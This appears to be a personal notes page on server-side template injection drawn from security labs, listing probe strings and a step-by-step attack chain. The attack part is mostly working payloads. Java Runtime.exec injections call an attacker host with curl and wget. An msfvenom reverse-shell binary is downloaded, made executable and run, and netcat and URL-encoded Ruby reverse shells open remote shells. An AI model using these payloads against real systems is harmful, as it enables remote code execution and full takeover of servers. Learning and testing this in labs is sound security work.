# Server-Side Template Injection - SSTI

[Back to Table of Contents](../cysec)
---
[Payload Box - SSTI](https://github.com/payloadbox/ssti-payloads)
---
## Notes from SSTI Labs

### Common test-cases:

````

{7*7}

{{7*7}}'

a{{bar}}b

{var} ${var} {{var}} <%var%> [% var %]


````

Example attack overview:

1.  Start local server.

````
python3 -m http.server 80
````
2. Test functionality of python server remotely using JS and curl.
````

*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("curl http://ip")}

````
3. Create reverse shell payload and initialize a netcat listener for it.

````
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=5010 -f elf > r.elf

nc -lvnp 443

````
4. Perform the SSTI, getting RCE on the server.

````

*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("wget 10.5.0.2:5003/r.elf")}


*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("chmod 777 ./r.elf")}


*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("./r.elf")}


*{os.system("nc -e /bin/sh ip 5010")}

<%=system("ruby%20-rsocket%20-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%22IP%22%2C5007%29%29%27")%>

````
Tools:

````
- sstimap

````

